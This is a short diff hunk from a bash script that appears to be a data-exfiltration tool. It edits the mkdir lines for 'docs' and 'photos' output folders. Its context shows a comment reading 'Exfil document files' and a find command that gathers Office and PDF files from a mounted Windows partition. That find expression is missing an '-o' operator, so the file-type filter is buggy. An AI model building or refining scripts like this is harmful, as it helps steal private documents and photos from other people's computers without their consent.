@@ -36,8 +36,8 @@ fi
 echo "Defining source and destination directories..."
 source_dir="$windows_partition"
 destination_dir="$destination_partition"
-mkdir "$destination_partition/docs"
-mkdir "$destination_partition/photos"
+mkdir "$destination_dir/docs"
+mkdir "$destination_dir/photos"
 
 # Exfil document files
 document_files=$(find "$source_dir" -type f \( -iname "*.doc" -o -iname "*.docx" -o -iname "*.pdf" -iname "*.xls" -o -iname "*.xlsx" \))
